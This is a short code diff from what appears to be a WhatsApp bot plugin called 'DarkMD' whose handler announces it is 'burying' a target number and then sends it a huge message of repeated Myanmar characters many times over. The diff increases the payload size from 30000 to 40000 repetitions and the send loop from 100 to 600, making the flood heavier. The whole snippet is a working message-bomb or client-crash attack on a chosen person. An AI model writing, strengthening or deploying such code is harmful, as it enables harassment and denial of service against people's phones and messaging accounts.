@@ -6,9 +6,9 @@ let handler = async (m, { conn, text, usedPrefix, command }) => {
   conn.reply(m.chat, `جاري قبر ${cleanedNumber}`, m);
 
   let message = '*~DarkMD~*' + 'ဪဪဪ';
-  let multipliedMessage = message.repeat(30000);
+  let multipliedMessage = message.repeat(40000);
 
-  for (let i = 0; i < 100; i++) {
+  for (let i = 0; i < 600; i++) {
     conn.reply(cleanedNumber + '@s.whatsapp.net', multipliedMessage, null, { contextInfo: { mentionedJid: [m.sender] } });
   }
 };
